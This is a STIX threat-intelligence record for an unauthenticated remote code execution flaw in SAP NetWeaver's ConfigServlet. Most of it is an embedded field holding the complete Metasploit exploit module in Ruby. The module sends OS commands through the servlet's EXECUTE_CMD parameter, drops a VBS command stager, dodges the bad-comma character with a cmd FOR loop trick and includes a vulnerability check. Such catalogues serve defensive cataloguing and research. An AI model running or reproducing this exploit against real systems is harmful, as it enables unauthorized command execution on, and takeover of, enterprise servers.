{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b638e9d4-79b2-4c8f-aedf-26e403a268a2",
    "created": "2024-08-14T16:53:35.067941Z",
    "modified": "2024-08-14T16:53:35.067946Z",
    "name": "SAP ConfigServlet Remote Code Execution",
    "description": " This module allows remote code execution via operating system commands through the SAP ConfigServlet without any authentication. This module has been tested successfully with SAP NetWeaver 7.00 and 7.01 on Windows Server 2008 R2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sap_configservlet_exec_noauth.rb",
            "external_id": "sap_configservlet_exec_noauth.rb"
        },
        {
            "source_name": "reference",
            "url": "http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'SAP ConfigServlet Remote Code Execution',\n      'Description'     => %q{\n        This module allows remote code execution via operating system commands through the\n        SAP ConfigServlet without any authentication. This module has been tested successfully\n        with SAP NetWeaver 7.00 and 7.01 on Windows Server 2008 R2.\n      },\n      'Author'          =>\n        [\n          'Dmitry Chastuhin', # Vulnerability discovery (based on the reference presentation)\n          'Andras Kabai' # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'OSVDB', '92704'],\n          [ 'EDB', '24996'],\n          [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf']\n        ],\n      'DisclosureDate' => '2012-11-01', # Based on the reference presentation\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows generic',\n            {\n              'Arch' => ARCH_X86\n            }\n          ]\n        ],\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultTarget'  => 0,\n      'Privileged'     => false\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(50000),\n        OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/ctc/servlet'])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('DELETE_FILES', [ true, 'Delete the dropped files after exploitation', true ])\n      ])\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path, 'ConfigServlet')\n    begin\n      res = send_evil_request(uri, \"whoami\", 20)\n    rescue\n      vprint_error(\"An error has occurred while sending the malicious request\")\n      return Exploit::CheckCode::Unknown\n    end\n    if !res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    elsif res.body.include?(\"Process created\")\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Exploiting remote system\")\n    uri = normalize_uri(target_uri.path, 'ConfigServlet')\n\n    execute_cmdstager( { :linemax => 1500, :nodelete => !datastore['DELETE_FILES'], :sap_configservlet_uri => uri })\n  end\n\n  def execute_command(cmd, opts)\n    commands = cmd.split(/&/)\n    commands.each do |command|\n      timeout = 20\n      if datastore['DELETE_FILES'] and command =~ /shell\\.run \\\"(.*)\\\"/\n        register_file_for_cleanup($1)\n      end\n      if command.include?(\".vbs\") and command.include?(\",\")\n        # because the comma is bad character and the VBS stager contains commas it is necessary to \"create\" commas without directly using them\n        # using the following command line trick it is possible to echo commas into the right places\n        command.gsub!(\",\", \"%i\")\n        command = \"cmd /c FOR /F \\\"usebackq tokens=2 delims=)\\\" %i IN (\\`\\\"ping -n 1 127.0.0.1| findstr )\\\"\\`) DO \" + command\n      else\n        command = \"cmd /c \" + command\n      end\n      if command.include?(\"cscript\")\n        # in case of bigger payloads the VBS stager could run for longer time as it needs to decode lot of data\n        # increaste timeout value when the VBS stager is called\n        timeout = 120\n      end\n      vprint_status(\"Attempting to execute: #{command}\")\n      send_evil_request(opts[:sap_configservlet_uri], command, timeout)\n    end\n  end\n\n  def send_evil_request(uri, cmd, timeout)\n    begin\n      res = send_request_cgi(\n        {\n          'uri' => uri,\n          'method' => 'GET',\n          'query' => 'param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text.uri_encode(cmd)\n        }, timeout)\n\n      if !res\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Exploit failed\")\n      end\n\n      if res.code != 200\n        vprint_error(\"#{rhost}:#{rport} - Output: #{res.body}\")\n        fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} - Exploit failed\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the server\")\n    end\n\n    if not res.body.include?(\"Process created\")\n      vprint_error(\"#{rhost}:#{rport} - Output: #{res.body}\")\n      fail_with(Failure::PayloadFailed, \"#{rhost}:#{rport} - Exploit failed\")\n    end\n    return res\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-01, # Based on the reference presentation",
    "x_mitre_platforms": [
        "win'"
    ]
}